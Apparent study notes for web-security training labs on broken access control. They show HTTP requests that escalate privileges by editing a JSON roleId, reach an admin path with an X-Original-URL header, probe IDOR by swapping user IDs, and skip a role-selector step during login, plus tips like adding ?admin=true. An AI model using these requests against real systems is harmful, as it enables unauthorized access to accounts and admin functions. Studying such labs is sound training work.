## 🎯 Overview

Access control vulnerabilities allow attackers to access resources or perform actions they shouldn't be authorized for.

## 🔥 Common Patterns

### Lab 1: User Role Modified in Profile
**Bypass:** JSON roleId manipulation

**Original Request:**
```http
POST /my-account HTTP/1.1
Content-Type: application/json

{
  "email": "user@example.com",
  "roleId": 1
}
```

**Exploit:**
```http
POST /my-account HTTP/1.1
Content-Type: application/json

{
  "email": "user@example.com",
  "roleId": 2
}
```

---

### Lab 2: URL-Based Access Control
**Bypass:** Change URL path or headers

**Bypass with X-Original-URL:**
```http
GET / HTTP/1.1
Host: vulnerable-site.com
X-Original-URL: /admin
```

---

### Lab 3: IDOR (Insecure Direct Object Reference)
**Bypass:** Change ID parameter

**Example:**
```http
GET /api/user/123/profile HTTP/1.1
```

Try:
```http
GET /api/user/1/profile HTTP/1.1
GET /api/user/admin/profile HTTP/1.1
```

### Lab 4: Auth logi bypass

During login a session token is generated. This token is then rewriten with a role asigned token. Anylize the token validity and privileges at every step of the login.

Request
```http
POST /login HTTP/2
Host: 0a4e0020031404fa80768a7000e0006c.web-security-academy.net
Cookie: session=ZTnw8s1VYNf404N77hbQfiqKV90g8Gdm
Content-Length: 68
Cache-Control: max-age=0
Sec-Ch-Ua: "Not A(Brand";v="99", "Chromium";v="154"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36
Origin: https://0a4e0020031404fa80768a7000e0006c.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a4e0020031404fa80768a7000e0006c.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

csrf=5eCaqdXX0DyJvYZbSImyns7ovRSsk1SK&username=wiener&password=peter
```

Response
```http
HTTP/2 302 Found
Location: /role-selector
Set-Cookie: session=5t0bx9IJQVkJqBBKQyCKMiItzTR7mys3; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0


```

Then this is done to reset role and set the current role:

Request
```http
GET /role-selector HTTP/2
Host: 0a4e0020031404fa80768a7000e0006c.web-security-academy.net
Cookie: session=5t0bx9IJQVkJqBBKQyCKMiItzTR7mys3
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not A(Brand";v="99", "Chromium";v="154"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://0a4e0020031404fa80768a7000e0006c.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

That request can be dropped to skip session role ressetting.

---



## 🎓 Exam Tips

1. **Check JSON in profile updates** - Look for `roleId`, `isAdmin`
2. **Try X-Original-URL header** - Common bypass for URL-based controls
3. **Test IDOR on all ID parameters** - Try `1`, `admin`, `administrator`
4. **Add admin parameters** - `?admin=true`, `?isAdmin=1`

---
